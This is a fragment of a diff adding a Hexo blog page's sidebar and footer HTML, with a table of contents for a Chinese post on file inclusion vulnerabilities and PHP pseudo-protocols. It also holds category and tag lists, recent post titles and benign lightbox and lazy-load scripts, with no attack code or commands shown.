class="toc-text">5.有限制本地文件包含漏洞绕过</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">3.远程文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E7%9A%84%E6%84%8F%E6%80%9D"><span class="toc-text">1.远程包含文件的意思</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%8C%85%E5%90%AB%E6%9D%A1%E4%BB%B6-1"><span class="toc-text">2.包含条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-text">3.绕过方式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">4.漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%EF%BC%9Aphp%E4%B8%BA%E5%8D%8F%E8%AE%AE"><span class="toc-text">三：php为协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%94%A8%E9%80%94"><span class="toc-text">1.php伪协议的用途</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%B8%89%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%9A%84PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3"><span class="toc-text">2.三种常用的PHP伪协议详解</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-file-%E5%8D%8F%E8%AE%AE"><span class="toc-text">1.file:&#x2F;&#x2F;协议</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-php-filter"><span class="toc-text">2.php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-php-input"><span class="toc-text">3.php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4-zip"><span class="toc-text">4.zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#5-compress-bzip2"><span class="toc-text">5.compress.bzip2:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#6-compress-bzip"><span class="toc-text">6.compress.bzip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#7-data"><span class="toc-text">7.data:&#x2F;&#x2F;</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header"><i class="iconfont icon-fenlei" style="padding-right: 2px;"></i>分类</div>
+  <div class="categories-list">
+    
+      <a href="/categories/计算机网络/">
+        <div class="categories-list-item">
+          计算机网络
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/CentoS-7基础/">
+        <div class="categories-list-item">
+          CentoS-7基础
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/web安全/">
+        <div class="categories-list-item">
+          web安全
+          <span class="categories-list-item-badge">7</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Mysql数据库/">
+        <div class="categories-list-item">
+          Mysql数据库
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/php代码基础/">
+        <div class="categories-list-item">
+          php代码基础
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+      <a href="/categories/windows-2008-R2/">
+        <div class="categories-list-item">
+          windows-2008-R2
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/文件上传漏洞/">
+        <div class="categories-list-item">
+          文件上传漏洞
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/文件包含漏洞/">
+        <div class="categories-list-item">
+          文件包含漏洞
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/渗透测试/">
+        <div class="categories-list-item">
+          渗透测试
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/代码审计/">
+        <div class="categories-list-item">
+          代码审计
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header"><i class="iconfont icon-biaoqian" style="padding-right: 2px;"></i>热门标签</div>
+  <div class="tags-list">
+    
+    <a href="/tags/SQL注入/" title="SQL注入"><div class="tags-list-item">SQL注入</div></a>
+    
+    <a href="/tags/Linux/" title="Linux"><div class="tags-list-item">Linux</div></a>
+    
+    <a href="/tags/计算机网络/" title="计算机网络"><div class="tags-list-item">计算机网络</div></a>
+    
+    <a href="/tags/php代码基础/" title="php代码基础"><div class="tags-list-item">php代码基础</div></a>
+    
+    <a href="/tags/web安全/" title="web安全"><div class="tags-list-item">web安全</div></a>
+    
+    <a href="/tags/代码审计/" title="代码审计"><div class="tags-list-item">代码审计</div></a>
+    
+    <a href="/tags/渗透测试/" title="渗透测试"><div class="tags-list-item">渗透测试</div></a>
+    
+    <a href="/tags/windows/" title="windows"><div class="tags-list-item">windows</div></a>
+    
+    <a href="/tags/webshell/" title="webshell"><div class="tags-list-item">webshell</div></a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+          <aside class="right-column">
+            <div class="sticky-widescreen">
+  
+  
+  <article class="card card-content toc-card">
+    <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">一：文件包含的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">1.漏洞利用函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%8F%E5%85%B8%E4%BB%A3%E7%A0%81"><span class="toc-text">2.文件包含经典代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-text">3.文件包含漏洞防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9A%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">二：文件包含漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%A6%82%E8%BF%B0"><span class="toc-text">1.文件包含漏洞的概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB"><span class="toc-text">2.本地包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E7%9A%84%E6%84%8F%E6%80%9D-LFI"><span class="toc-text">1.本地包含的意思(LFI)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%8C%85%E5%90%AB%E6%9D%A1%E4%BB%B6"><span class="toc-text">2.包含条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%97%A0%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="toc-text">3.无限制本地文件包含漏洞代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%97%A0%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">4.无限制本地文件包含漏洞利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E6%9C%89%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-text">5.有限制本地文件包含漏洞绕过</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">3.远程文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E7%9A%84%E6%84%8F%E6%80%9D"><span class="toc-text">1.远程包含文件的意思</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%8C%85%E5%90%AB%E6%9D%A1%E4%BB%B6-1"><span class="toc-text">2.包含条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-text">3.绕过方式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">4.漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%EF%BC%9Aphp%E4%B8%BA%E5%8D%8F%E8%AE%AE"><span class="toc-text">三：php为协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%94%A8%E9%80%94"><span class="toc-text">1.php伪协议的用途</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%B8%89%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%9A%84PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3"><span class="toc-text">2.三种常用的PHP伪协议详解</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-file-%E5%8D%8F%E8%AE%AE"><span class="toc-text">1.file:&#x2F;&#x2F;协议</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-php-filter"><span class="toc-text">2.php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-php-input"><span class="toc-text">3.php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4-zip"><span class="toc-text">4.zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#5-compress-bzip2"><span class="toc-text">5.compress.bzip2:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#6-compress-bzip"><span class="toc-text">6.compress.bzip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#7-data"><span class="toc-text">7.data:&#x2F;&#x2F;</span></a></li></ol></li></ol></li></ol></li></ol>
+  </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header"><i class="iconfont icon-wenzhang_huaban" style="padding-right: 2px;"></i>最近文章</div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-23</div>
+        <a href="/2022/02/23/文件包含漏洞/"><div class="recent-posts-item-content">文件包含漏洞</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-23</div>
+        <a href="/2022/02/23/文件上传漏洞/"><div class="recent-posts-item-content">文件上传漏洞</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-17</div>
+        <a href="/2022/02/17/mysql数据外带/"><div class="recent-posts-item-content"></div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-17</div>
+        <a href="/2022/02/17/一：获取数据库网站密码/"><div class="recent-posts-item-content"></div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>Copyright ©
+          
+          2020 -
+          
+          2022
+        </span>
+        &nbsp;
+        <a href="/" class="footer-link">混口饭吃 </a>
+      </div>
+    </div>
+
+    
+    <div class="footer-dsc">
+      
+      Powered by
+      <a href="https://hexo.io/" class="footer-link" target="_blank" rel="nofollow noopener noreferrer">&nbsp;Hexo </a>
+      
+      
+      <span>&nbsp;|&nbsp;</span>
+      
+      
+      Theme -
+      <a href="https://github.com/theme-kaze" class="footer-link" target="_blank"
+        rel="nofollow noopener noreferrer">&nbsp;Kaze</a>
+      
+    </div>
+    
+    
+    
+    
+</footer>
+  <a role="button" id="scrollbutton" class="basebutton"  aria-label="回到顶部">
+  <i class="iconfont icon-arrowleft button-icon"></i>
+</a>
+<a role="button" id="menubutton" class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a role="button" id="popbutton" class="basebutton" aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a role="button" id="darkbutton" class="basebutton darkwidget" aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a role="button" id="searchbutton" class="basebutton searchwidget" aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a>
+
+  
+  
+  
+  <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img');
+    var i;
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a');
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'));
+      wrapper.setAttribute('aria-label', 'illustration');
+      wrapper.style.cssText = 'width: 100%; display: flex; justify-content: center;';
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt;
+      wrapper.dataset.nolink = true;
+      img[i].before(wrapper);
+      wrapper.append(img[i]);
+      var divWrap = document.createElement('div');
+      divWrap.classList.add('gallery');
+      wrapper.before(divWrap);
+      divWrap.append(wrapper);
+    }
+    baguetteBox.run('.gallery');
+  }
+</script>
+<script>loadScript("/js/lib/lightbox/baguetteBox.min.js", addImgLayout)</script>
+  
+  
+  
+<script src="/js/main.js"></script>
+
+  
+  
+  <script>
+    var addLazyload = function () {
+      var observer = lozad('.lozad', {
+        load: function (el) {
+          el.srcset = el.getAttribute('data-src');
+        },
+        loaded: function (el) {
+          el.classList.add('loaded');
+        }
+      });
+      observer.observe();
+    }
+  </script>
+  <script>loadScript("/js/lib/lozad.min.js", addLazyload)</script>
+  
+  
+</body>
+
+</html>
